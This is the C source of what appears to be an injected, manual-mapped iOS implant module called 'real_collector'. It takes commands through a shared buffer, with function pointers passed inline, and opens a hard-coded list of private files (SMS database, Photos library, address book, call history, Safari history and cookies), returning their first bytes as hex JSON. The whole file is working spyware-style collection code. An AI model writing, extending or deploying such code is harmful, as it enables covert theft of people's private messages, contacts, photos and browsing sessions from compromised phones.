/*
 * real_collector v3 — freestanding, manual-mapped (RX safe)
 * NEVER write static/global for APIs (mapped page may be RX-only).
 * Every cmd carries open/read/close pointers; locals on stack only.
 *
 * Commands:
 *   ping
 *   rh:o=0x..,r=0x..,c=0x..,p=/path     (read head 32 bytes hex)
 *   rf:o=0x..,r=0x..,c=0x..             (fixed path table heads)
 * Export: process -> _process
 */

typedef unsigned int uint32_t;
typedef unsigned char uint8_t;
typedef unsigned long long uint64_t;
typedef unsigned long uintptr_t;

#define STATE_READY 3
#define STATE_EXIT  5
#define STATE_FEED  6

typedef int (*fn_open_t)(const char *path, int flags, ...);
typedef long long (*fn_read_t)(int fd, void *buf, unsigned long n);
typedef int (*fn_close_t)(int fd);

static const char *const FIXED_PATHS[] = {
    "/private/var/mobile/Library/SMS/sms.db",
    "/var/mobile/Library/SMS/sms.db",
    "/private/var/mobile/Media/PhotoData/Photos.sqlite",
    "/var/mobile/Media/PhotoData/Photos.sqlite",
    "/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
    "/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
    "/private/var/mobile/Library/Safari/History.db",
    "/private/var/mobile/Library/Cookies/Cookies.binarycookies",
    "/System/Library/CoreServices/SystemVersion.plist",
    "/etc/hosts",
    0
};

static int scmp(const char *a, const char *b) {
    int i = 0;
    if (!a || !b) return 1;
    while (a[i] && b[i]) {
        if (a[i] != b[i]) return (unsigned char)a[i] - (unsigned char)b[i];
        i++;
    }
    return (unsigned char)a[i] - (unsigned char)b[i];
}

static int sncmp(const char *a, const char *b, int n) {
    int i;
    for (i = 0; i < n; i++) {
        unsigned char ca = (unsigned char)a[i];
        unsigned char cb = (unsigned char)b[i];
        if (ca != cb) return ca - cb;
        if (!ca) return 0;
    }
    return 0;
}

static int slen(const char *s) {
    int n = 0;
    if (!s) return 0;
    while (s[n]) n++;
    return n;
}

static void buffer_set(uint32_t *D, const char *s) {
    uint8_t *p = (uint8_t *)(D + 2);
    int i, n = slen(s);
    if (n > 4095) n = 4095;
    for (i = 0; i < n; i++) p[i] = (uint8_t)s[i];
    p[n] = 0;
    D[1] = (uint32_t)n;
    D[0] = STATE_READY;
}

static int append_str(char *out, int off, int max, const char *s) {
    int i = 0;
    if (!out || !s || off < 0) return off;
    while (s[i] && off + i < max - 1) { out[off + i] = s[i]; i++; }
    out[off + i] = 0;
    return off + i;
}

static int append_int(char *out, int off, int max, long long v) {
    char tmp[24];
    int n = 0, neg = 0, i;
    if (v < 0) { neg = 1; v = -v; }
    if (v == 0) tmp[n++] = '0';
    while (v && n < 22) { tmp[n++] = (char)('0' + (v % 10)); v /= 10; }
    if (neg && off < max - 1) out[off++] = '-';
    for (i = n - 1; i >= 0 && off < max - 1; i--) out[off++] = tmp[i];
    out[off] = 0;
    return off;
}

static int append_hex_u64(char *out, int off, int max, uint64_t v) {
    const char *hex = "0123456789abcdef";
    char tmp[20];
    int n = 0, i;
    if (v == 0) tmp[n++] = '0';
    else while (v && n < 16) { tmp[n++] = hex[v & 0xf]; v >>= 4; }
    for (i = n - 1; i >= 0 && off < max - 1; i--) out[off++] = tmp[i];
    out[off] = 0;
    return off;
}

static int hex_byte(char *out, int off, int max, uint8_t b) {
    const char *hex = "0123456789abcdef";
    if (off + 2 >= max) return off;
    out[off++] = hex[(b >> 4) & 0xf];
    out[off++] = hex[b & 0xf];
    out[off] = 0;
    return off;
}

static uint64_t parse_hex_ptr(const char *s) {
    uint64_t v = 0;
    int i = 0;
    if (!s) return 0;
    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) i = 2;
    for (; s[i]; i++) {
        char c = s[i];
        int d = -1;
        if (c >= '0' && c <= '9') d = c - '0';
        else if (c >= 'a' && c <= 'f') d = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') d = c - 'A' + 10;
        else break;
        v = (v << 4) | (uint64_t)d;
    }
    return v;
}

/* find key= value start; keys like o= r= c= p= */
static const char *find_kv(const char *s, const char *key) {
    int kl = slen(key);
    int i = 0;
    if (!s || !key) return 0;
    while (s[i]) {
        if (sncmp(s + i, key, kl) == 0 && s[i + kl] == '=')
            return s + i + kl + 1;
        i++;
    }
    return 0;
}

/* copy value until comma or end into dst */
static void copy_val(const char *src, char *dst, int max) {
    int i = 0;
    if (!src || !dst || max <= 0) return;
    while (src[i] && src[i] != ',' && i < max - 1) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = 0;
}

struct Apis {
    fn_open_t o;
    fn_read_t r;
    fn_close_t c;
};

static int parse_apis(const char *args, struct Apis *a) {
    char vb[32];
    const char *vo, *vr, *vc;
    a->o = 0; a->r = 0; a->c = 0;
    vo = find_kv(args, "o");
    if (!vo) vo = find_kv(args, "open");
    vr = find_kv(args, "r");
    if (!vr) vr = find_kv(args, "read");
    vc = find_kv(args, "c");
    if (!vc) vc = find_kv(args, "close");
    if (vo) { copy_val(vo, vb, sizeof(vb)); a->o = (fn_open_t)(uintptr_t)parse_hex_ptr(vb); }
    if (vr) { copy_val(vr, vb, sizeof(vb)); a->r = (fn_read_t)(uintptr_t)parse_hex_ptr(vb); }
    if (vc) { copy_val(vc, vb, sizeof(vb)); a->c = (fn_close_t)(uintptr_t)parse_hex_ptr(vb); }
    return (a->o && a->r && a->c) ? 1 : 0;
}

/* write one path result into out; stack only */
static int try_read_head(struct Apis *a, const char *path, int maxN, char *out, int maxOut) {
    uint8_t buf[96];
    int fd, n, i, off = 0;
    if (!a || !a->o || !a->r || !a->c || !path || !out) return 0;
    if (maxN > 64) maxN = 64;
    if (maxN < 1) maxN = 32;
    fd = a->o(path, 0);
    if (fd < 0) {
        off = append_str(out, 0, maxOut, "{\"path\":\"");
        off = append_str(out, off, maxOut, path);
        off = append_str(out, off, maxOut, "\",\"ok\":false,\"err\":\"open_fail\",\"fd\":");
        off = append_int(out, off, maxOut, fd);
        off = append_str(out, off, maxOut, "}");
        return 0;
    }
    n = (int)a->r(fd, buf, (unsigned long)maxN);
    a->c(fd);
    if (n < 0) n = 0;
    off = append_str(out, 0, maxOut, "{\"path\":\"");
    off = append_str(out, off, maxOut, path);
    off = append_str(out, off, maxOut, "\",\"ok\":true,\"size\":");
    off = append_int(out, off, maxOut, n);
    off = append_str(out, off, maxOut, ",\"hex\":\"");
    for (i = 0; i < n; i++) off = hex_byte(out, off, maxOut, buf[i]);
    off = append_str(out, off, maxOut, "\"}");
    return 1;
}

static void handle_rh(uint32_t *D, const char *args) {
    struct Apis a;
    char one[768], wrap[900], pathbuf[256];
    const char *pp;
    int off = 0;
    if (!parse_apis(args, &a)) {
        buffer_set(D, "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"rh\",\"error\":\"bad_apis\"}");
        return;
    }
    pp = find_kv(args, "p");
    if (!pp) pp = find_kv(args, "path");
    if (!pp) {
        buffer_set(D, "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"rh\",\"error\":\"no_path\"}");
        return;
    }
    copy_val(pp, pathbuf, sizeof(pathbuf));
    try_read_head(&a, pathbuf, 32, one, sizeof(one));
    off = append_str(wrap, 0, sizeof(wrap),
        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"rh\",\"item\":");
    off = append_str(wrap, off, sizeof(wrap), one);
    off = append_str(wrap, off, sizeof(wrap), "}");
    buffer_set(D, wrap);
}

static void handle_rf(uint32_t *D, const char *args) {
    struct Apis a;
    char one[700], out[4090];
    int i, off = 0, hits = 0, tried = 0;
    if (!parse_apis(args, &a)) {
        buffer_set(D, "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"rf\",\"error\":\"bad_apis\"}");
        return;
    }
    off = append_str(out, 0, sizeof(out),
        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"rf\","
        "\"method\":\"fixed_path_open_read\",\"items\":[");
    for (i = 0; FIXED_PATHS[i]; i++) {
        int ok;
        if (off > 3600) break;
        tried++;
        ok = try_read_head(&a, FIXED_PATHS[i], 32, one, sizeof(one));
        if (tried > 1) off = append_str(out, off, sizeof(out), ",");
        off = append_str(out, off, sizeof(out), one);
        if (ok) {
            /* count ok:true */
            int j;
            for (j = 0; one[j]; j++) {
                if (sncmp(one + j, "\"ok\":true", 9) == 0) { hits++; break; }
            }
        }
    }
    off = append_str(out, off, sizeof(out), "],\"tried\":");
    off = append_int(out, off, sizeof(out), tried);
    off = append_str(out, off, sizeof(out), ",\"hits\":");
    off = append_int(out, off, sizeof(out), hits);
    off = append_str(out, off, sizeof(out), "}");
    buffer_set(D, out);
}

int process(void *buffer) {
    uint32_t *D;
    uint8_t *payload;
    uint32_t st;

    if (!buffer) return 0;
    D = (uint32_t *)buffer;
    payload = (uint8_t *)(D + 2);
    st = D[0];

    if (st == STATE_EXIT) return 0;

    if (st == STATE_FEED) {
        if (payload[0] == 'c' && payload[1] == 'm' && payload[2] == 'd' && payload[3] == ':') {
            const char *cmd = (const char *)(payload + 4);
            if (scmp(cmd, "ping") == 0) {
                buffer_set(D,
                    "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"ping\","
                    "\"note\":\"freestanding_v3\",\"apis\":\"inline\"}");
                return 0;
            }
            if (sncmp(cmd, "rh:", 3) == 0) {
                handle_rh(D, cmd + 3);
                return 0;
            }
            if (sncmp(cmd, "rf:", 3) == 0) {
                handle_rf(D, cmd + 3);
                return 0;
            }
            /* legacy aliases */
            if (sncmp(cmd, "read_head:", 10) == 0) {
                buffer_set(D,
                    "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"read_head\","
                    "\"error\":\"use_rh_with_inline_apis\"}");
                return 0;
            }
            if (scmp(cmd, "read_fixed") == 0 || sncmp(cmd, "setapis:", 8) == 0) {
                buffer_set(D,
                    "{\"ok\":false,\"source\":\"real_collector\",\"error\":\"use_rf_or_rh_v3\"}");
                return 0;
            }
            if (scmp(cmd, "device_info") == 0) {
                buffer_set(D,
                    "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"device_info\","
                    "\"mode\":\"freestanding_v3\"}");
                return 0;
            }
            if (scmp(cmd, "exit") == 0) {
                D[0] = STATE_EXIT;
                D[1] = 0;
                return 0;
            }
            buffer_set(D,
                "{\"ok\":false,\"source\":\"real_collector\",\"error\":\"unknown_command\"}");
            return 0;
        }
        buffer_set(D,
            "{\"ok\":false,\"source\":\"real_collector\",\"error\":\"expected_cmd_prefix\"}");
        return 0;
    }

    buffer_set(D,
        "{\"ok\":true,\"source\":\"real_collector\",\"event\":\"boot\","
        "\"msg\":\"dylib_started\",\"mode\":\"freestanding_v3\"}");
    return 0;
}
